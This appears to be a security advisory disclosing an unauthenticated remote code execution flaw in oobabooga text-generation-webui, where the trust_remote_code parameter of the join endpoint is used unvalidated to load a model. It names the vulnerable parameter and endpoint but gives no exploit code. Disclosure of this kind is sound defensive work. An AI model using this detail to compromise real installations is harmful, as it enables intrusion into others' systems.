This vulnerability allows remote attackers to execute arbitrary code on affected installations of oobabooga text-generation-webui. Authentication is not required to exploit this vulnerability.\n\nThe specific flaw exists within the handling of the trust_remote_code parameter provided to the join endpoint. The issue results from the lack of proper validation of a user-supplied argument before using it to load a model. An attacker can leverage this vulnerability to execute code in the context of the service account.
